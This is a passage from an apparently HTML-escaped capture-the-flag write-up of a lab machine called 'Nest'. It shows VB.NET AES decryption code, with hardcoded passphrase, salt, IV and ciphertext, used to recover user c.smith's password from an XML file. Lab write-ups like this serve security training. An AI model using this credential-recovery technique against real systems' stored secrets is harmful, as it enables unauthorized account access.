&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Rfc2898DeriveBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CipherMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ICryptoTransform&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateDecryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                        &lt;/span&gt;&lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                        &lt;/span&gt;&lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;ReDim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                              &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                              &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                            &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                            &lt;/span&gt;&lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Class&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We fire up a Windows Box, install Microsoft Visual Basic 2010 Express and create
a new "Application Console project" with a simple module to decode the c.smith
password we got in the XML file.&lt;/p&gt;
&lt;p&gt;&lt;img alt="creating a Application Console project" src="/media/2020.06/nest_02.png"&gt;&lt;/p&gt;
&lt;p&gt;The code is the following. As the console is disappearing just after the run I
put a second print and run the program in debug mode.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Imports&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Text&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Imports&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;System.Security.Cryptography&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Module&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;Module1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;N3st22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;88552299&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;464R5DFA5DL6LE28&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Sub&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                              &lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                      &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
